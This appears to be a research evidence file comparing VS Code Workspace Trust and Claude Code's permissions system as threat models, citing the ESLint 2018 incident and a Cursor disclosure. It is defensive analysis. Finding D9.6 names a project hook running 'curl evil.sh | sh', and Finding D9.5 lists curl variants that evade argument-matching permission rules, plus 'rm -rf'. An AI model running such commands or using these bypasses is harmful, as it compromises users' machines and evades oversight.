# Evidence: D9 — Threat Models: Workspace Trust vs Permissions DSL

**Dimension:** What attack class each design defends against, what each leaves uncovered, and where each was bypassed in production. Extends D5/D6 with threat-model depth.
**Date:** 2026-04-25
**Sources:** VS Code Workspace Trust blog (2021-07-06); VS Code Workspace Trust docs + Extension Guide; ESLint 2018 postmortem; Claude Code permissions/security/sandboxing/hooks docs; Help Net Security on Cursor disclosure (2025-09-11); JetBrains Project Security docs.

---

## Key files / pages referenced

- `https://code.visualstudio.com/blogs/2021/07/06/workspace-trust` — Microsoft's design rationale; "Whack-a-Mole" framing; consolidation motivation
- `https://code.visualstudio.com/docs/editing/workspaces/workspace-trust` — what Restricted Mode gates: agents, tasks, debug, restricted settings, non-opted-in extensions
- `https://code.visualstudio.com/api/extension-guides/workspace-trust` — `capabilities.untrustedWorkspaces`, `restrictedConfigurations`, isTrusted API
- `https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/` — canonical 2018 incident: `eslint-scope@3.7.2` + `eslint-config-eslint@5.0.2` (NOT "eslint-loader" — common folk-memory conflation)
- `https://code.claude.com/docs/en/permissions` — DSL syntax, symlink rule, fragility warning for argument-constraining patterns
- `https://code.claude.com/docs/en/security` — explicit security model, prompt-injection treatment
- `https://code.claude.com/docs/en/sandboxing` — OS-level sandbox via Seatbelt/bubblewrap; documented limitations
- `https://code.claude.com/docs/en/hooks` — confirms no per-hook approval prompt
- `https://www.helpnetsecurity.com/2025/09/11/cursor-ai-editor-vulnerability/` — Cursor default-off Workspace Trust
- `https://www.jetbrains.com/help/idea/project-security.html` — IntelliJ trust prompt scope

---

## Findings

### Finding D9.1: VS Code Workspace Trust was a 2021 consolidation of scattered modal trust prompts, motivated by the 2018 ESLint npm supply-chain incident
**Confidence:** CONFIRMED
**Evidence:** `code.visualstudio.com/blogs/2021/07/06/workspace-trust`; `eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/`

```text
VS Code blog:
"The ESLint vulnerability was a doozy because it runs when the workspace
 loads (this was our first modal dialog)."

"Development tools like VS Code integrate package managers, code linters,
 task runners, bundlers, etc."  → broad machine access

Prior surface area was scattered "Whack-a-Mole" prompts (Jupyter warnings,
ESLint modal dialog, etc.). Workspace Trust unified the gating model.
```

**Important correction:** The actual ESLint incident packages were `eslint-scope@3.7.2` and `eslint-config-eslint@5.0.2`. The name "eslint-loader" is a folk-memory conflation; it does not appear in the canonical ESLint postmortem. Attack vector was a `postinstall` script that exfiltrated `.npmrc` tokens to pastebin. Root cause: maintainer password reuse + no 2FA.

**Implication:** Establishes the historical pivot point — Workspace Trust is best understood as a 2021 consolidation of pre-existing per-extension trust dialogs, triggered by a 2018 npm supply-chain incident. Frames the parent's asymmetry: VS Code retrofitted gates onto a pre-existing extension/task model; Claude Code's permissions DSL was greenfield from the start.

### Finding D9.2: VS Code Workspace Trust gates four concrete categories — extensions, tasks, debug, and a per-setting `restricted` flag
**Confidence:** CONFIRMED
**Evidence:** `code.visualstudio.com/docs/editing/workspaces/workspace-trust`; `code.visualstudio.com/api/extension-guides/workspace-trust`

```text
Restricted Mode disables:
1. AI Agents — "Opening a workspace in restricted mode disables agents..."
2. Tasks — even enumeration prompts confirmation
3. Debugging — "debugging is also disabled when a folder is open in Restricted Mode"
4. Workspace settings tagged @tag:requireTrustedWorkspace
5. Extensions that haven't opted in via `capabilities.untrustedWorkspaces`

Extension API contract: declare one of:
- supported: true        → fully Restricted-Mode-safe
- supported: false       → fully disabled in Restricted Mode
- supported: 'limited'   → partial; trust-sensitive features disabled
                           (description property required)

restrictedConfigurations[]: settings where only the user-defined value
                            (not workspace-defined) is honored in Restricted Mode.
```

**Implication:** Trust is binary per workspace folder, but each capability declares its trust-dependency at registration. Default is "needs trust." The dual-knob design (folder-level trust × extension-level opt-in) sets up the contrast with Claude Code's per-tool gating.

### Finding D9.3: VS Code Workspace Trust intentionally permits text editing, syntax highlighting, and basic browsing in Restricted Mode
**Confidence:** CONFIRMED
**Evidence:** `code.visualstudio.com/docs/editing/workspaces/workspace-trust`; Workspace Trust blog

```text
"Yes, you can still browse and edit source code in Restricted Mode.
 Some language features may be disabled, but text editing is always supported."

Blog: "potentially harmful functionality is disabled so you can more
 safely browse the code."
```

Read-side actions (file reads, syntax highlighting, theme application, basic markdown rendering) are explicitly outside the Trust boundary. The threat model is "code execution on workspace open," not "user-initiated reads of malicious bytes."

**Implication:** Trust is *not* trying to defend against, e.g., a malicious markdown file with a homoglyph URL. Important for the parent report's side-by-side: Claude Code's permissions DSL has `Read(...)` rules; VS Code structurally has no read-side gate because reads are by definition human-initiated.

### Finding D9.4: Claude Code's permissions DSL targets a different threat class — per-tool-call by an autonomous agent, not "code execution on folder open"
**Confidence:** CONFIRMED
**Evidence:** `code.claude.com/docs/en/permissions`; `code.claude.com/docs/en/security`

```text
From Permissions docs:
"Claude Code uses a tiered permission system to balance power and safety"
- Read-only: no approval (built-in: ls, cat, grep, find, …)
- Bash: approval required, session/persistent rules opt-in
- File modification: approval required per session

From Security docs:
"Claude Code uses strict read-only permissions by default."

"Trust verification: First-time codebase runs and new MCP servers
 require trust verification. Note: Trust verification is disabled when
 running non-interactively with the -p flag"
```

Two threat models stack:
1. **Untrusted user prompts / prompt injection** — agent might be told to do bad things; permissions gate per-tool-call.
2. **Untrusted codebase content** — addressed via "first-time codebase trust verification" (the closest analog to Workspace Trust) but **disabled by `-p` flag** for non-interactive use.

**Implication:** Names the threat class precisely. Workspace Trust defends against "I opened a malicious folder, now what?" The Permissions DSL defends against "the agent is about to take an action — should it?" These overlap but aren't substitutes.

### Finding D9.5: Claude Code's argument-constraining Bash patterns are documented as fragile; explicit guidance to use deny + WebFetch + hooks instead
**Confidence:** CONFIRMED
**Evidence:** `code.claude.com/docs/en/permissions`

```text
Verbatim warning:

"Bash permission patterns that try to constrain command arguments are
 fragile. For example, Bash(curl http://github.com/ *) intends to
 restrict curl to GitHub URLs, but won't match variations like:
 - Options before URL: curl -X GET http://github.com/...
 - Different protocol: curl https://github.com/...
 - Redirects: curl -L http://bit.ly/xyz (redirects to github)
 - Variables: URL=http://github.com && curl $URL
 - Extra spaces: curl  http://github.com"

"Note that using WebFetch alone does not prevent network access. If Bash
 is allowed, Claude can still use curl, wget, or other tools to reach any URL."
```

Documented additional fragilities:
- Process wrappers strip a fixed list (`timeout`, `time`, `nice`, `nohup`, `stdbuf`) but development runners (`devbox run`, `npx`, `docker exec`, `direnv exec`, `mise exec`) are *not* stripped — `Bash(devbox run *)` matches `devbox run rm -rf .`.
- Compound commands split per-subcommand (`&&`, `||`, `;`, `|`, etc.) but only "up to 5 rules may be saved for a single compound command."
- **Read/Edit deny rules apply to Claude's built-in tools, not Bash subprocesses.** A `Read(./.env)` deny does not block `cat .env`. OS-level enforcement requires sandbox.

**Implication:** The DSL is granular but the granularity has documented trade-offs. Relying on argument filtering in Bash rules will fail open. The "deny `Bash(curl:*)` and use `WebFetch(domain:...)` instead" pattern is the official guidance.

### Finding D9.6: Claude Code hooks have NO per-hook approval prompt — trust is purely scope-provenance + the enterprise `allowManagedHooksOnly` switch
**Confidence:** CONFIRMED
**Evidence:** `code.claude.com/docs/en/hooks`; cross-ref D3.6 in `evidence/d3-claude-code-topology.md`

```text
Documented controls (only):
- allowManagedHooksOnly: true  → blocks user/project/non-force-enabled-plugin
                                  hooks; only managed + SDK + force-enabled-plugin hooks load.
- disableAllHooks: true        → disables all hooks; user-level cannot disable
                                  managed hooks.

NOT documented:
- Per-hook "approve this on first encounter?" prompt
- "This .claude/settings.json contains hooks — review them?" first-clone gate
- Equivalent to the @import external-file CLAUDE.md prompt
```

**Asymmetry within Claude Code's own model:** when CLAUDE.md uses `@external/file.md` for the first time, Claude prompts. When `.claude/settings.json` contains a `PreToolUse` hook running `curl evil.sh | sh`, no equivalent prompt fires on first clone. Provenance is recorded via the `[Project]` label on hook output, but the gate is post-hoc visibility, not pre-execution consent.

**Implication:** Concretely names the gap the parent flagged abstractly. The asymmetry between `@import` (gated) and project hooks (not gated) is intentional but creates a meaningful attack surface — a malicious PR adding hooks lands silently after merge.

### Finding D9.7: Claude Code symlink semantics are deny-aggressive / allow-conservative — both link and target must satisfy allow; either matching denies blocks
**Confidence:** CONFIRMED
**Evidence:** `code.claude.com/docs/en/permissions`

```text
"When Claude accesses a symlink, permission rules check two paths:
 the symlink itself and the file it resolves to. Allow and deny rules
 treat that pair differently:
 - Allow rules: apply only when both the symlink path and its target match.
 - Deny rules: apply when either the symlink path or its target matches.

 For example, with Read(./project/**) allowed and Read(~/.ssh/**) denied,
 a symlink at ./project/key pointing to ~/.ssh/id_rsa is blocked: the target
 fails the allow rule and matches the deny rule."
```

What's NOT covered:
- TOCTOU between the permission check and the actual read (no documentation; the model assumes single-shot resolution).
- Symlink races during writes.
- The Read/Edit rule scope only applies to Claude's built-in tools — Bash subprocesses bypass these checks (Finding D9.5).

**Implication:** Closest thing to a documented path-traversal defense in the Claude Code DSL. VS Code Workspace Trust has no analog — Trust is per-folder, so symlinks pointing out are an OS-level concern, not a Trust concern.

### Finding D9.8: Project-disallowed credential helper fields are an explicit defense against committed-config supply-chain attacks — VS Code has no equivalent threat model
**Confidence:** CONFIRMED
**Evidence:** D3.3 in `evidence/d3-claude-code-topology.md`; `code.claude.com/docs/en/settings`

```text
"User, Local, Managed only" fields (project-disallowed):
- apiKeyHelper, awsCredentialExport, awsAuthRefresh, otelHeadersHelper
- permissions.skipDangerousModePermissionPrompt
- autoMode, useAutoModeDuringPlan
- autoMemoryDirectory  ← documented rationale:
- sshConfigs

Verbatim rationale (autoMemoryDirectory):
"It is not accepted from project settings (.claude/settings.json) to prevent
 a shared project from redirecting auto memory writes to sensitive locations"
```

**The asymmetry:** anyone who can land a PR to `.claude/settings.json` cannot redirect credential helpers, MFA prompts, or auto-memory. They CAN add hooks (Finding D9.6) and add `permissions.allow` entries that array-merge upward (D3.2). The defense is field-class-specific, not blanket.

VS Code's policy system supports per-setting policy declarations, but not a "this setting is structurally not accepted at workspace scope" rule. The asymmetric scope-validity table is unique to Claude Code among the products surveyed.

**Implication:** Names the design constraint that motivated the asymmetric scope-validity table — supply-chain attack via PR. This is the *positive* answer to "what does each defend against" that complements Finding D9.6's gap.

### Finding D9.9: Cursor (VS Code fork) ships Workspace Trust default-off; September 2025 Oasis Security disclosure; Anysphere did not change the default
**Confidence:** CONFIRMED
**Evidence:** `helpnetsecurity.com/2025/09/11/cursor-ai-editor-vulnerability/`; Oasis Security disclosure

```text
"Cursor ships with Workspace Trust turned off by default ... a project can
 include a hidden 'autorun' instruction that tells the IDE to execute a
 task the moment you open the folder: no prompt, no consent."

"there's no mention of changing the default Workspace Trust setting"
[Anysphere committed only to publishing security guidance]

Mitigation: enable "security.workspace.trust.enabled": true
Trade-off: "Workspace Trust disables AI and other Cursor features"
```

The trade-off is structural: Cursor's AI features are extension code that runs at trust level. Enabling Workspace Trust per VS Code semantics disables the core product. Anysphere's calculated choice is to ship default-off and document the risk.

**Implication:** Inheriting VS Code's Workspace Trust mechanism does not mean adopting its defaults. The Cursor case shows that the trust-vs-functionality trade-off can break the product's value proposition, leading vendors to ship the gate disabled.

### Finding D9.10: JetBrains' "Trust and open project" is structurally similar to VS Code Workspace Trust — same threat model, slightly broader gate set
**Confidence:** CONFIRMED
**Evidence:** `jetbrains.com/help/idea/project-security.html`

```text
Trust prompt gates:
- Build tool imports (Gradle, Maven, sbt): "no build scripts are
  executed and no dependencies are resolved"
- Startup tasks: "any scripts or tasks that are executed during the
  opening process are disabled"
- Scripting: "any Groovy DSL scripts will not be executed"; File Watcher scripts disabled
- Version control: "VCS support is fully disabled"

Threat model: "projects that contains unfamiliar source code"
```

JetBrains gates VCS as well — VS Code does not gate file-watcher / git operations under Restricted Mode. The categories overlap but JetBrains is broader.

**Implication:** Confirms the binary-trust-on-folder-open pattern as the consensus among traditional IDEs (VS Code + JetBrains converged independently). Makes Claude Code's per-tool-gating model the outlier — driven by the agent execution model, not editor execution.

---

## Negative searches

* **TOCTOU symlink Claude Code permissions** — NOT FOUND. Docs describe the symlink check semantics but not race conditions between check and use.
* **Per-hook approval prompt in Claude Code 2026 docs** — NOT FOUND (confirms Finding D9.6's negative claim).
* **"eslint-loader" 2018 incident details** — NOT FOUND as a specific package. The canonical 2018 incident was `eslint-scope@3.7.2` and `eslint-config-eslint@5.0.2`. "eslint-loader" appears to be a folk-memory conflation in secondary discussion.
* **VS Code Workspace Trust threat model for prompt injection / agent context** — NOT FOUND. Workspace Trust 2021 predates the agent threat model; docs mention "AI Agents disabled in Restricted Mode" but no structural defense against prompt injection itself.
* **Anthropic explicit comparison of permissions DSL vs Workspace Trust** — NOT FOUND. The Claude Code Security page references VS Code only via "see VS Code security and privacy" link.

---

## Gaps / follow-ups

* **TOCTOU specification gap** — the Claude Code symlink rule is documented as single-check-time evaluation; whether the resolved path is re-checked at the syscall is implicit.
* **Real-world incident catalog under each model** — Workspace Trust was triggered by ESLint-2018; the analogous catalog for Claude Code is not yet public.
* **`bypassPermissions` mode risk surface** — `permissions.defaultMode: bypassPermissions` is documented as "skips permission prompts except writes to .git/.claude/.vscode/.idea/.husky." Major escape hatch the parent didn't surface.
* **Cursor's AI-features-vs-Trust trade-off generalizability** — *any* AI-augmented editor faces this trade-off. VS Code's own Copilot/agent integration also disables under Restricted Mode (per Finding D9.2), but the implications for forks aren't documented.
